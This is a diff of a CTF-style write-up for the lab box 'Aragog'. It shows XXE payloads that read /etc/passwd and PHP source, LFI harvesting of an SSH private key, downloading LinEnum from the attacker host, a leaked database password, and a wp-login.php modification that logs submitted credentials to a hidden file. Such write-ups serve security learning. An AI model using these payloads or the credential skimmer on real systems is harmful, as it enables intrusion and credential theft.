@@ -59,7 +59,7 @@ This does not give any information about the box but it could be a hint because 
 
 ## Checking HTTP (Port 80)
 
-On the web page there is the Apache2 default page, so we should look for hidden directories with **Gobuster**:
+On the web page there is the Apache2 default page, so lets look for hidden directories with **Gobuster**:
 ```markdown
 gobuster -u http://10.10.10.78 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
 ```
@@ -67,7 +67,7 @@ gobuster -u http://10.10.10.78 dir -w /usr/share/wordlists/dirbuster/directory-l
 It finds _hosts.php_ where it says one sentence:
 > There are 4294967294 possible hosts for
 
-Sending it to a proxy like **Burpsuite** and trying out, if it accepts data by changing the HTTP request to _POST_ and appending some data at the end of the request. As we got data from the file on FTP in XML format, appending that seems like the way to go:
+Sending it to a proxy like **Burpsuite** and trying out if it accepts data by changing the HTTP request to _POST_ and appending something at the end of the request. As we got data from the file on FTP in XML format, appending that seems like the way to go:
 ```markdown
 POST /hosts.php HTTP/1.1
 Host: 10.10.10.78
@@ -100,7 +100,7 @@ Before exploiting the XXE, we should test for it with this basic XML string:
 Now the string between the _subnet_mask_ tag gets replaced by the variable _&example_ whose value is _Test_ and the response becomes:
 > There are 4294967294 possible hosts for Test
 
-With this method, it is possible to retrieve system files with the _SYSTEM_ command:
+With this method it is possible to retrieve system files with the _SYSTEM_ command:
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
@@ -113,7 +113,7 @@ With this method, it is possible to retrieve system files with the _SYSTEM_ comm
 This displays the contents of the _/etc/passwd_ file.
 There are two non-default users on the box that could be useful later called _cliff_ and _florian_.
 
-Also interesting is the content of the _hosts.php_:
+Also interesting is the content of the _hosts.php_.
 ```xml
 <!--?xml version="1.0" ?-->
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
@@ -123,7 +123,7 @@ Also interesting is the content of the _hosts.php_:
 </details>
 ```
 
-This outputs the contents of the file as _Base64-decoded_, which can be decoded to read the source code:
+This outputs the contents of the file in _Base64_ which can be decoded to read the source code:
 ```markdown
 echo PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo= | base64 -d > hosts.php
 ```
@@ -131,9 +131,97 @@ echo PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHh
 The source code reveals that it is possible to load **DTD files** which can be used to gain code execution with XML.
 For this to work, we need to find a way to create such a file on the system.
 
-So lets search for a **Local File Inclusion** to accomplish this.
+As there is no way to do that, lets look for a **Local File Inclusion** to search for sensitive files.
 
 ### Looking for LFI
 
 The [LFISuite](https://github.com/D35m0nd142/LFISuite) has tools and lists to automatically search for LFI.
-I will only use the _pathtotest.txt_ file as the wordlist and write a Python script that can be found in this repository.
+I will only use the _pathtotest.txt_ file as the wordlist and include some directories that can be found in user directories for example _/.ssh/id_rsa_ and _/.bash_history_.
+
+Now writing a Python script that can be found in this repository to automate the process:
+```markdown
+python aragog_lfi.py
+```
+
+This grabs the home directories out of the _/etc/passwd_ file and tries to get the contents of files specified in the wordlist to input them into the XXE vulnerability. The results are the contents of _/home/florian/.ssh/id_rsa_ and _/home/florian/.bash_history_.
+
+The _id_rsa_ file is a private SSH key which can be copied to use the key ourselves to log into the box as the user _florian_:
+```markdown
+chmod 600 id_rsa_florian
+
+ssh -i id_rsa_florian florian@10.10.10.78
+```
+
+## Privilege Escalation
+
+Now we are logged in on the box as _florian_ and need to look for an attack surface for higher privileges.
+Lets run any **Linux Enumeration script** to get information about the box:
+```markdown
+wget 10.10.14.34/LinEnum.sh
+
+bash LinEnum.sh
+```
+
+After analyzing it, there seems to be another directory on the web server named _/dev_wiki_.
+This path forwards us to a **WordPress blog page** with one article that says:
+```markdown
+Hi Florian,
+
+Thought we could use a wiki.  Feel free to log in and have a poke around – but as I’m messing about with a lot of changes I’ll probably be restoring the site from backup fairly frequently!
+
+I’ll be logging in regularly and will email the wider team when I need some more testers.
+
+Cliff
+```
+
+The fact that _cliff_ logs in regularly is a hint, that this user needs to be attacked.
+As everyone has read permissions on the _/var/www/html/dev_wiki/_ directory, it is possible to get the database password out of the _wp-config.php_ file:
+```markdown
+define('DB_NAME', 'wp_wiki');
+define('DB_USER', 'root');
+define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');
+define('DB_HOST', 'localhost');
+```
+
+This password works on the **MySQL** instance:
+```markdown
+mysql -u root -p
+
+use wp_wiki;
+select * from wp_users;
+```
+
+This gets the hashed password for the **WordPress** user _Administrator_:
+```markdown
++----+---------------+------------------------------------+---------------+
+| ID | user_login    | user_pass                          | user_nicename |
++----+---------------+------------------------------------+---------------+
+|  1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator |
++----+---------------+------------------------------------+---------------+
+```
+
+The _/dev_wiki_ directory updates his date regularly, so this means that a cronjob is doing something with it.
+It seems like it gets backed up into the directory _/var/www/html/zz_backup_ every five minutes.
+
+Instead of trying to crack the gathered password, we modify the _wp-login_ configuration in WordPress to send the credentials into another file when someone logs in.
+To do that, appending the following code on line 843 in the configuration will do the trick:
+```php
+// (...)
+841 case 'login' :
+842 default:
+843         file_put_contents(".Testing", $\_POST['log'] . ":" . $\_POST['pwd'] . "\n", FILE_APPEND);
+844         $secure_cookie = '';
+845         $customize_login = isset( $\_REQUEST['customize-login'] );
+// (...)
+```
+
+Now when _cliff_ logs in, the credentials will be forwarded into the file _.Testing_ in the same directory.
+After waiting for a while, the user logs in as _Administrator_ and the password gets written into the file:
+```markdown
+Administrator:!KRgYs(JFO!&MTr)lf
+```
+
+If we try this password to switch user to root it also works!
+```markdown
+su - root
+```
